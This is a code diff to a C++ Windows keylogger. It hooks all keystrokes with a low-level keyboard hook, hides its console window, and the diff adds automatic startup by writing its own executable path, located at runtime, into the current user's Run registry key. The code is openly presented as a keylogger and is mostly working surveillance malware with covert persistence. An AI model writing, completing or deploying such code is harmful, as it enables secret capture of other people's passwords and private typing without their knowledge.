@@ -3,17 +3,18 @@
 #include <Windows.h>
 #include <string>
 #include <fstream>
-void hide(); 
-void show(); 
+void hide();
+void show();
 bool saveToFile(DWORD key);
 bool addToStartup(); // starts keylogger at startup by adding it to the registry
+std::wstring findexePth();
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam); // keyboard hook production
 HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
 
 int main()
 {
 	hide();
-	
+	addToStartup();
 	MSG Msg;
 	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
 	{
@@ -113,12 +114,14 @@ bool saveToFile(DWORD key)
 
 bool addToStartup()
 {
-	std::string progPath = "C:\\Program Files\\DEBUG - KEYLOGGER\\KeyLogger.exe"; // path to keylogger.exe file
+	std::wstring progPath = findexePth(); // function to find the path to keylogger.exe
+	if (progPath == L" ")
+		return false;
 	HKEY hkey = NULL; // registry variable
-	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
 	if (createStatus != ERROR_SUCCESS) // RegCreateKey returns 0L or ERROR_SUCCESS if succeeded
 		return false;
-	RegSetValueEx(hkey, "KeyLogger", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(char)); // sets the registry value to the keylogger.exe path
+	RegSetValueEx(hkey, L"KeyLogger", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t)); // sets the registry value to the keylogger.exe path
 	RegCloseKey(hkey);
 	return true;
 }
@@ -142,4 +145,19 @@ static void hide()
 static void show()
 {
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
+}
+
+std::wstring findexePth()
+{
+	WCHAR ourPth[MAX_PATH];
+	// When NULL is passed to GetModuleHandle, the handle of the exe itself is returned
+	HMODULE hModule = GetModuleHandle(NULL);
+	if (hModule != NULL)
+	{
+		// Use GetModuleFileName() with module handle to get the path
+		GetModuleFileName(hModule, ourPth, (sizeof(ourPth)));
+		std::wstring fullPth(ourPth); // converting the path to wstring 
+		return fullPth;
+	}
+	return L" ";
 }
